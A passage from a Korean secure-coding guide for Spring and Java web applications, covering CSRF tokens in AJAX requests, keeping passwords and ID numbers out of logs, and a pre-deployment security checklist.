    url: "/board/insert.do",
    type: "POST",
    data: { title: "제목", content: "내용" },
    beforeSend: function(xhr) {
        // 요청 헤더에 CSRF 토큰 추가
        xhr.setRequestHeader(csrfHeader, csrfToken);
    },
    success: function(data) {
        alert("저장 완료");
    }
});
```

---

## 7. 로깅 시 보안 주의사항

### 7.1 민감 정보 로깅 금지

** 절대 금지:**
```java
LOGGER.info("로그인 시도 - ID: {}, PW: {}", userId, password);  // 비밀번호 노출!
LOGGER.debug("사용자 정보: {}", userVO);  // toString()에 주민번호 포함 가능
```

** 안전한 방법:**
```java
LOGGER.info("로그인 시도 - ID: {}", userId);  // 비밀번호는 절대 로깅하지 않음
LOGGER.debug("사용자 정보 - ID: {}, 이름: {}", userVO.getId(), userVO.getName());  // 필요한 것만 선택적으로
```

### 7.2 VO에서 민감 정보 제외

```java
public class UserVO {
    private String userId;
    private String password;    // 민감 정보
    private String ssn;         // 주민번호 (민감 정보)
    private String name;

    @Override
    public String toString() {
        // password, ssn은 제외하고 출력
        return "UserVO{" +
               "userId='" + userId + '\'' +
               ", name='" + name + '\'' +
               '}';
    }
}
```

---

## 8. 실무 체크리스트

프로젝트 배포 전 반드시 확인해야 할 보안 항목입니다.

### 8.1 인증/인가
- [ ] 비밀번호 암호화 (BCrypt/PBKDF2) 적용
- [ ] 로그인 시 세션 재발급 (세션 고정 공격 방어)
- [ ] 세션 타임아웃 설정 (30분 이내)
- [ ] 세션 쿠키 HttpOnly 설정
- [ ] 로그인 인터셉터 적용

### 8.2 입력값 검증
- [ ] XSS 방어 (`<c:out>` 또는 Lucy Filter)
- [ ] SQL Injection 방어 (MyBatis `#{}` 사용)
- [ ] 파일 업로드 확장자 검증 (화이트리스트)
- [ ] 파일 크기 제한
- [ ] CSRF 토큰 적용

### 8.3 파일 처리
- [ ] 업로드 경로를 웹 루트 밖에 설정
- [ ] UUID 등으로 안전한 파일명 생성
- [ ] MIME 타입 검증
- [ ] Path Traversal 방어

### 8.4 로깅
- [ ] 민감 정보(비밀번호, 주민번호 등) 로깅 금지
- [ ] 운영 환경에서 DEBUG 레벨 비활성화
- [ ] 로그 파일 접근 권한 제한

### 8.5 기타
- [ ] DB 접속 정보 암호화 (Jasypt 등)
- [ ] 에러 페이지에서 상세 정보 노출 금지
- [ ] 불필요한 HTTP 메소드 비활성화 (TRACE, OPTIONS)
- [ ] HTTPS 적용 (운영 환경)

---

### 요약
1.  **비밀번호**: 절대 평문 저장/비교 금지. BCrypt 필수.
2.  **세션**: 로그인 성공 시 새 세션 발급. 인터셉터로 체크.
3.  **XSS**: `<c:out>` 또는 Lucy Filter 사용.
4.  **SQL Injection**: MyBatis `#{}` 사용, `${}` 금지 (ORDER BY 제외).
5.  **파일 업로드**: 확장자 화이트리스트 + UUID 파일명 + 웹 루트 밖 저장.
6.  **CSRF**: Spring Security CSRF 토큰 적용.
7.  **로깅**: 민감 정보 절대 로깅 금지.
